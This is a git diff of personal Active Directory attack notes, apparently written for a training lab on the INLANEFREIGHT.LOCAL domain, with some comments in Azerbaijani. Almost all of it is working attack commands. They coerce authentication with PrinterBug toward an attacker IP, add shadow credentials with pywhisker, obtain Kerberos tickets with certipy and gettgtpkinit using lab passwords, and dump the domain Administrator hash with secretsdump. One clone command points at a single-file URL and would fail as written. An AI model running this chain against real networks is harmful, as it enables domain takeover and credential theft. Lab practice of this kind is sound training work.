@@ -18,21 +18,9 @@ pip install certipy-ad
 certipy find -u 'username@domain' -p 'Pass123!' -dc-ip DC_IP -target domain.local
 certipy find -u 'user' -p 'pass' -dc-ip DC_IP -username target_admin
 
-# 1. PrinterBug
+# 1. PrinterBug ( HTTP or HTTPS = True )
+git clone https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py ( Krbrelayx )
 python3 printerbug.py INLANEFREIGHT.LOCAL/<USER>:"<PLAINTEXT_PASSWORD>"@<TARGET_IP> <ATTACKER_IP>
-
-# 2. Gettgtpkinit.py
-git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
-pip3 install -r requirements.txt
-pip3 install -I git+https://github.com/wbond/oscrypto.git
-
-python3 gettgtpkinit.py \
-  -cert-pfx ../krbrelayx/DC01$.pfx \
-  -dc-ip 10.129.234.109 \
-  'inlanefreight.local/dc01$' \
-  /tmp/dc.ccache
-
-export KRB5CCNAME=/tmp/dc.ccache
 
 impacket-secretsdump \
   -k -no-pass \
@@ -40,7 +28,7 @@ impacket-secretsdump \
   -just-dc-user Administrator \
   'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
 
-# 3. Pywhisker
+# 2. Pywhisker
 git clone https://github.com/ShutdownRepo/pywhisker
 pip install -r requirements.txt
 
@@ -60,8 +48,17 @@ python3 pywhisker.py --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 
 [*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
 [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
 
-python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+# 3. CERTIPY-AD İlə TGT almağa çalışaq. 
+certipy-ad auth -pfx WA0y5Wvh.pfx -username jpinkman -domain inlanefreight.local  -dc-ip 10.129.4.236 -password YwOt9ukrIsfNYFRTk31Y
+export KRB5CCNAME=/tmp/jpinkman.ccache
+klist
 
+# 3. Gettgtpkinit.py ( Başqa üsulla TGT almaq )
+git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
+pip3 install -r requirements.txt
+pip3 install -I git+https://github.com/wbond/oscrypto.git
+
+python3 gettgtpkinit.py -cert-pfx /home/sako/Special-Tools/Active-Directory/Pywhisker/pywhisker/457l8Zmd.pfx -pfx-pass bmRH4LK7UwPrAOfvIx6W -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
 export KRB5CCNAME=/tmp/jpinkman.ccache
 klist
 
